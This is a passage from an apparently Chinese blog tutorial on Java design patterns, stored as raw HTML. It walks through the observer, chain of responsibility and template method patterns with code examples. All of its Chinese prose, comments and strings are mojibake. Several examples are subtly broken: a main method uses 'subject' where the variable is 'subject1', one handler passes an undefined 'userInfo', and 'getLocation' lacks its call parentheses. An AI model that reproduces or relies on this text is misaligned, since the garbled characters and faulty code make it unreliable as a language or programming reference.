å¤–ä¹ä¸¤ä¸ªæ“ä½œï¼Œè§‚å¯Ÿè€…è®¢é˜…è‡ªå·±å…³å¿ƒçš„ä¸»é¢˜å’Œä¸»é¢˜æœ‰æ•°æ®å˜åŒ–åé€šçŸ¥è§‚å¯Ÿè€…ä»¬ã€‚</p><p>é¦–å…ˆï¼Œéœ€è¦å®šä¹‰ä¸»é¢˜ï¼Œæ¯ä¸ªä¸»é¢˜éœ€è¦æŒæœ‰è§‚å¯Ÿè€…åˆ—è¡¨çš„å¼•ç”¨ï¼Œç”¨äºåœ¨æ•°æ®å˜æ›´çš„æ—¶å€™é€šçŸ¥å„ä¸ªè§‚å¯Ÿè€…ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Subject</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Observer&gt; observers = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Observer&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> state;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getState</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> state;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setState</span><span class="params">(<span class="type">int</span> state)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.state = state;</span><br><span class="line">        <span class="comment">// æ•°æ®å·²å˜æ›´ï¼Œé€šçŸ¥è§‚å¯Ÿè€…ä»¬</span></span><br><span class="line">        notifyAllObservers();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ³¨å†Œè§‚å¯Ÿè€…</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attach</span><span class="params">(Observer observer)</span> &#123;</span><br><span class="line">        observers.add(observer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// é€šçŸ¥è§‚å¯Ÿè€…ä»¬</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">notifyAllObservers</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Observer observer : observers) &#123;</span><br><span class="line">            observer.update();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰è§‚å¯Ÿè€…æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Observer</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Subject subject;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®å¦‚æœåªæœ‰ä¸€ä¸ªè§‚å¯Ÿè€…ç±»çš„è¯ï¼Œæ¥å£éƒ½ä¸ç”¨å®šä¹‰äº†ï¼Œä¸è¿‡ï¼Œé€šå¸¸åœºæ™¯ä¸‹ï¼Œæ—¢ç„¶ç”¨åˆ°äº†è§‚å¯Ÿè€…æ¨¡å¼ï¼Œæˆ‘ä»¬å°±æ˜¯å¸Œæœ›ä¸€ä¸ªäº‹ä»¶å‡ºæ¥äº†ï¼Œä¼šæœ‰å¤šä¸ªä¸åŒçš„ç±»éœ€è¦å¤„ç†ç›¸åº”çš„ä¿¡æ¯ã€‚æ¯”å¦‚ï¼Œè®¢å•ä¿®æ”¹æˆåŠŸäº‹ä»¶ï¼Œæˆ‘ä»¬å¸Œæœ›å‘çŸ­ä¿¡çš„ç±»å¾—åˆ°é€šçŸ¥ã€å‘é‚®ä»¶çš„ç±»å¾—åˆ°é€šçŸ¥ã€å¤„ç†ç‰©æµä¿¡æ¯çš„ç±»å¾—åˆ°é€šçŸ¥ç­‰ã€‚</p><p>æˆ‘ä»¬æ¥å®šä¹‰å…·ä½“çš„å‡ ä¸ªè§‚å¯Ÿè€…ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinaryObserver</span> <span class="keyword">extends</span> <span class="title class_">Observer</span> &#123;</span><br><span class="line">    <span class="comment">// åœ¨æ„é€ æ–¹æ³•ä¸­è¿›è¡Œè®¢é˜…ä¸»é¢˜</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BinaryObserver</span><span class="params">(Subject subject)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.subject = subject;</span><br><span class="line">        <span class="comment">// é€šå¸¸åœ¨æ„é€ æ–¹æ³•ä¸­å°† this å‘å¸ƒå‡ºå»çš„æ“ä½œä¸€å®šè¦å°å¿ƒ</span></span><br><span class="line">        <span class="built_in">this</span>.subject.attach(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è¯¥æ–¹æ³•ç”±ä¸»é¢˜ç±»åœ¨æ•°æ®å˜æ›´çš„æ—¶å€™è¿›è¡Œè°ƒç”¨</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> Integer.toBinaryString(subject.getState());</span><br><span class="line">        System.out.println(<span class="string">&quot;è®¢é˜…çš„æ•°æ®å‘ç”Ÿå˜åŒ–ï¼Œæ–°çš„æ•°æ®å¤„ç†ä¸ºäºŒè¿›åˆ¶å€¼ä¸ºï¼š&quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HexaObserver</span> <span class="keyword">extends</span> <span class="title class_">Observer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HexaObserver</span><span class="params">(Subject subject)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.subject = subject;</span><br><span class="line">        <span class="built_in">this</span>.subject.attach(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> Integer.toHexString(subject.getState()).toUpperCase();</span><br><span class="line">        System.out.println(<span class="string">&quot;è®¢é˜…çš„æ•°æ®å‘ç”Ÿå˜åŒ–ï¼Œæ–°çš„æ•°æ®å¤„ç†ä¸ºåå…­è¿›åˆ¶å€¼ä¸ºï¼š&quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯ä½¿ç”¨ä¹Ÿéå¸¸ç®€å•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">// å…ˆå®šä¹‰ä¸€ä¸ªä¸»é¢˜</span></span><br><span class="line">    <span class="type">Subject</span> <span class="variable">subject1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Subject</span>();</span><br><span class="line">    <span class="comment">// å®šä¹‰è§‚å¯Ÿè€…</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">BinaryObserver</span>(subject1);</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HexaObserver</span>(subject1);</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// æ¨¡æ‹Ÿæ•°æ®å˜æ›´ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œè§‚å¯Ÿè€…ä»¬çš„ update æ–¹æ³•å°†ä¼šè¢«è°ƒç”¨</span></span><br><span class="line">    subject.setState(<span class="number">11</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è®¢é˜…çš„æ•°æ®å‘ç”Ÿå˜åŒ–ï¼Œæ–°çš„æ•°æ®å¤„ç†ä¸ºäºŒè¿›åˆ¶å€¼ä¸ºï¼š1011</span><br><span class="line">è®¢é˜…çš„æ•°æ®å‘ç”Ÿå˜åŒ–ï¼Œæ–°çš„æ•°æ®å¤„ç†ä¸ºåå…­è¿›åˆ¶å€¼ä¸ºï¼šB</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œjdk ä¹Ÿæä¾›äº†ç›¸ä¼¼çš„æ”¯æŒï¼Œå…·ä½“çš„å¤§å®¶å¯ä»¥å‚è€ƒ java.util.Observable å’Œ java.util.Observer è¿™ä¸¤ä¸ªç±»ã€‚</p><p>å®é™…ç”Ÿäº§è¿‡ç¨‹ä¸­ï¼Œè§‚å¯Ÿè€…æ¨¡å¼å¾€å¾€ç”¨æ¶ˆæ¯ä¸­é—´ä»¶æ¥å®ç°ï¼Œå¦‚æœè¦å®ç°å•æœºè§‚å¯Ÿè€…æ¨¡å¼ï¼Œç¬”è€…å»ºè®®è¯»è€…ä½¿ç”¨ Guava ä¸­çš„ EventBusï¼Œå®ƒæœ‰åŒæ­¥å®ç°ä¹Ÿæœ‰å¼‚æ­¥å®ç°ï¼Œæœ¬æ–‡ä¸»è¦ä»‹ç»è®¾è®¡æ¨¡å¼ï¼Œå°±ä¸å±•å¼€è¯´äº†ã€‚</p><p>è¿˜æœ‰ï¼Œå³ä½¿æ˜¯ä¸Šé¢çš„è¿™ä¸ªä»£ç ï¼Œä¹Ÿä¼šæœ‰å¾ˆå¤šå˜ç§ï¼Œå¤§å®¶åªè¦è®°ä½æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œé‚£å°±æ˜¯ä¸€å®šæœ‰ä¸€ä¸ªåœ°æ–¹å­˜æ”¾äº†æ‰€æœ‰çš„è§‚å¯Ÿè€…ï¼Œç„¶ååœ¨äº‹ä»¶å‘ç”Ÿçš„æ—¶å€™ï¼Œéå†è§‚å¯Ÿè€…ï¼Œè°ƒç”¨å®ƒä»¬çš„å›è°ƒå‡½æ•°ã€‚</p><h3><span id="è´£ä»»é“¾æ¨¡å¼">è´£ä»»é“¾æ¨¡å¼</span></h3><p>è´£ä»»é“¾é€šå¸¸éœ€è¦å…ˆå»ºç«‹ä¸€ä¸ªå•å‘é“¾è¡¨ï¼Œç„¶åè°ƒç”¨æ–¹åªéœ€è¦è°ƒç”¨å¤´éƒ¨èŠ‚ç‚¹å°±å¯ä»¥äº†ï¼Œåé¢ä¼šè‡ªåŠ¨æµè½¬ä¸‹å»ã€‚æ¯”å¦‚æµç¨‹å®¡æ‰¹å°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œåªè¦ç»ˆç«¯ç”¨æˆ·æäº¤ç”³è¯·ï¼Œæ ¹æ®ç”³è¯·çš„å†…å®¹ä¿¡æ¯ï¼Œè‡ªåŠ¨å»ºç«‹ä¸€æ¡è´£ä»»é“¾ï¼Œç„¶åå°±å¯ä»¥å¼€å§‹æµè½¬äº†ã€‚</p><p>æœ‰è¿™ä¹ˆä¸€ä¸ªåœºæ™¯ï¼Œç”¨æˆ·å‚åŠ ä¸€ä¸ªæ´»åŠ¨å¯ä»¥é¢†å–å¥–å“ï¼Œä½†æ˜¯æ´»åŠ¨éœ€è¦è¿›è¡Œå¾ˆå¤šçš„è§„åˆ™æ ¡éªŒç„¶åæ‰èƒ½æ”¾è¡Œï¼Œæ¯”å¦‚é¦–å…ˆéœ€è¦æ ¡éªŒç”¨æˆ·æ˜¯å¦æ˜¯æ–°ç”¨æˆ·ã€ä»Šæ—¥å‚ä¸äººæ•°æ˜¯å¦æœ‰é™é¢ã€å…¨åœºå‚ä¸äººæ•°æ˜¯å¦æœ‰é™é¢ç­‰ç­‰ã€‚è®¾å®šçš„è§„åˆ™éƒ½é€šè¿‡åï¼Œæ‰èƒ½è®©ç”¨æˆ·é¢†èµ°å¥–å“ã€‚</p><blockquote><p>å¦‚æœäº§å“ç»™ä½ è¿™ä¸ªéœ€æ±‚çš„è¯ï¼Œæˆ‘æƒ³å¤§éƒ¨åˆ†äººä¸€å¼€å§‹è‚¯å®šæƒ³çš„å°±æ˜¯ï¼Œç”¨ä¸€ä¸ª List æ¥å­˜æ”¾æ‰€æœ‰çš„è§„åˆ™ï¼Œç„¶å foreach æ‰§è¡Œä¸€ä¸‹æ¯ä¸ªè§„åˆ™å°±å¥½äº†ã€‚ä¸è¿‡ï¼Œè¯»è€…ä¹Ÿå…ˆåˆ«æ€¥ï¼Œçœ‹çœ‹è´£ä»»é“¾æ¨¡å¼å’Œæˆ‘ä»¬è¯´çš„è¿™ä¸ªæœ‰ä»€ä¹ˆä¸ä¸€æ ·ï¼Ÿ</p></blockquote><p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦å®šä¹‰æµç¨‹ä¸ŠèŠ‚ç‚¹çš„åŸºç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">RuleHandler</span> &#123;</span><br><span class="line">    <span class="comment">// åç»§èŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">protected</span> RuleHandler successor;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">(Context context)</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSuccessor</span><span class="params">(RuleHandler successor)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.successor = successor;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> RuleHandler <span class="title function_">getSuccessor</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> successor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰å…·ä½“çš„æ¯ä¸ªèŠ‚ç‚¹äº†ã€‚</p><p>æ ¡éªŒç”¨æˆ·æ˜¯å¦æ˜¯æ–°ç”¨æˆ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NewUserRuleHandler</span> <span class="keyword">extends</span> <span class="title class_">RuleHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (context.isNewUser()) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœæœ‰åç»§èŠ‚ç‚¹çš„è¯ï¼Œä¼ é€’ä¸‹å»</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.getSuccessor() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.getSuccessor().apply(context);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;è¯¥æ´»åŠ¨ä»…é™æ–°ç”¨æˆ·å‚ä¸&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¡éªŒç”¨æˆ·æ‰€åœ¨åœ°åŒºæ˜¯å¦å¯ä»¥å‚ä¸ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LocationRuleHandler</span> <span class="keyword">extends</span> <span class="title class_">RuleHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">allowed</span> <span class="operator">=</span> activityService.isSupportedLocation(context.getLocation);</span><br><span class="line">        <span class="keyword">if</span> (allowed) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.getSuccessor() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.getSuccessor().apply(context);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;éå¸¸æŠ±æ­‰ï¼Œæ‚¨æ‰€åœ¨çš„åœ°åŒºæ— æ³•å‚ä¸æœ¬æ¬¡æ´»åŠ¨&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¡éªŒå¥–å“æ˜¯å¦å·²é¢†å®Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LimitRuleHandler</span> <span class="keyword">extends</span> <span class="title class_">RuleHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">remainedTimes</span> <span class="operator">=</span> activityService.queryRemainedTimes(context); <span class="comment">// æŸ¥è¯¢å‰©ä½™å¥–å“</span></span><br><span class="line">        <span class="keyword">if</span> (remainedTimes &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.getSuccessor() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.getSuccessor().apply(userInfo);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;æ‚¨æ¥å¾—å¤ªæ™šäº†ï¼Œå¥–å“è¢«é¢†å®Œäº†&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">RuleHandler</span> <span class="variable">newUserHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NewUserRuleHandler</span>();</span><br><span class="line">    <span class="type">RuleHandler</span> <span class="variable">locationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LocationRuleHandler</span>();</span><br><span class="line">    <span class="type">RuleHandler</span> <span class="variable">limitHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LimitRuleHandler</span>();</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// å‡è®¾æœ¬æ¬¡æ´»åŠ¨ä»…æ ¡éªŒåœ°åŒºå’Œå¥–å“æ•°é‡ï¼Œä¸æ ¡éªŒæ–°è€ç”¨æˆ·</span></span><br><span class="line">    locationHandler.setSuccessor(limitHandler);</span><br><span class="line">  </span><br><span class="line">    locationHandler.apply(context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯å…ˆå®šä¹‰å¥½ä¸€ä¸ªé“¾è¡¨ï¼Œç„¶ååœ¨é€šè¿‡ä»»æ„ä¸€èŠ‚ç‚¹åï¼Œå¦‚æœæ­¤èŠ‚ç‚¹æœ‰åç»§èŠ‚ç‚¹ï¼Œé‚£ä¹ˆä¼ é€’ä¸‹å»ã€‚</p><p>è‡³äºå®ƒå’Œæˆ‘ä»¬å‰é¢è¯´çš„ç”¨ä¸€ä¸ª List å­˜æ”¾éœ€è¦æ‰§è¡Œçš„è§„åˆ™çš„åšæ³•æœ‰ä»€ä¹ˆå¼‚åŒï¼Œç•™ç»™è¯»è€…è‡ªå·±ç¢ç£¨å§ã€‚</p><h3><span id="æ¨¡æ¿æ–¹æ³•æ¨¡å¼">æ¨¡æ¿æ–¹æ³•æ¨¡å¼</span></h3><p>åœ¨å«æœ‰ç»§æ‰¿ç»“æ„çš„ä»£ç ä¸­ï¼Œæ¨¡æ¿æ–¹æ³•æ¨¡å¼æ˜¯éå¸¸å¸¸ç”¨çš„ã€‚</p><p>é€šå¸¸ä¼šæœ‰ä¸€ä¸ªæŠ½è±¡ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractTemplate</span> &#123;</span><br><span class="line">    <span class="comment">// è¿™å°±æ˜¯æ¨¡æ¿æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">templateMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        init();</span><br><span class="line">        apply(); <span class="comment">// è¿™ä¸ªæ˜¯é‡ç‚¹</span></span><br><span class="line">        end(); <span class="comment">// å¯ä»¥ä½œä¸ºé’©å­æ–¹æ³•</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init æŠ½è±¡å±‚å·²ç»å®ç°ï¼Œå­ç±»ä¹Ÿå¯ä»¥é€‰æ‹©è¦†å†™&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç•™ç»™å­ç±»å®ç°</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">end</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¨¡æ¿æ–¹æ³•ä¸­è°ƒç”¨äº† 3 ä¸ªæ–¹æ³•ï¼Œå…¶ä¸­ apply() æ˜¯æŠ½è±¡æ–¹æ³•ï¼Œå­ç±»å¿…é¡»å®ç°å®ƒï¼Œå…¶å®æ¨¡æ¿æ–¹æ³•ä¸­æœ‰å‡ ä¸ªæŠ½è±¡æ–¹æ³•å®Œå…¨æ˜¯è‡ªç”±çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†ä¸‰ä¸ªæ–¹æ³•éƒ½è®¾ç½®ä¸ºæŠ½è±¡æ–¹æ³•ï¼Œè®©å­ç±»æ¥å®ç°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¨¡æ¿æ–¹æ³•åªè´Ÿè´£å®šä¹‰ç¬¬ä¸€æ­¥åº”è¯¥è¦åšä»€ä¹ˆï¼Œç¬¬äºŒæ­¥åº”è¯¥åšä»€ä¹ˆï¼Œç¬¬ä¸‰æ­¥åº”è¯¥åšä»€ä¹ˆï¼Œè‡³äºæ€ä¹ˆåšï¼Œç”±å­ç±»æ¥å®ç°ã€‚</p><p>æˆ‘ä»¬å†™ä¸€ä¸ªå®ç°ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcreteTemplate</span> <span class="keyword">extends</span> <span class="title class_">AbstractTemplate</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">apply</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å­ç±»å®ç°æŠ½è±¡æ–¹æ³• apply&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">end</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æˆ‘ä»¬å¯ä»¥æŠŠ method3 å½“åšé’©å­æ–¹æ³•æ¥ä½¿ç”¨ï¼Œéœ€è¦çš„æ—¶å€™è¦†å†™å°±å¯ä»¥äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯è°ƒç”¨æ¼”ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">AbstractTemplate</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcreteTemplate</span>();</span><br><span class="line">    <span class="comment">// è°ƒç”¨æ¨¡æ¿æ–¹æ³•</span></span><br><span class="line">    t.templateMethod();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç å…¶å®å¾ˆç®€å•ï¼ŒåŸºæœ¬ä¸Šçœ‹åˆ°å°±æ‡‚äº†ï¼Œå…³é”®æ˜¯è¦å­¦ä¼šç”¨åˆ°è‡ªå·±çš„ä»£ç ä¸­ã€‚</p><h3><span id="çŠ¶æ€æ¨¡å¼">çŠ¶æ€æ¨¡å¼</span></h3><p>update: 